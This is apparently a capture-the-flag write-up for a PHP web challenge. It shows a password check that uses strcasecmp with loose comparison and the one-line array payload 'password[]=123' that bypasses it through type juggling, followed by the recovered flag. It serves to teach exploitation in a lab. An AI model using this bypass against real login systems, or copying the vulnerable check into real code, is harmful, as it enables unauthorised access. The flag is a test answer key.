# Just Not My Type

*I really don't think we're compatible ([Link](http://143.198.184.186:7000/))*

---

源文件:

```php+HTML
<h1>I just don't think we're compatible</h1>
<?php
$FLAG = "shhhh you don't get to see this locally";
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{
    $password = $_POST["password"];
    if (strcasecmp($password, $FLAG) == 0) {
        echo $FLAG;
    } 
    else {
        echo "That's the wrong password!";
    }
}
?>
<form method="POST">
    Password
    <input type="password" name="password">
    <input type="submit">
</form>
```

**Payload**

```php+HTML
password[]=123
```

**flag:**`flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}`

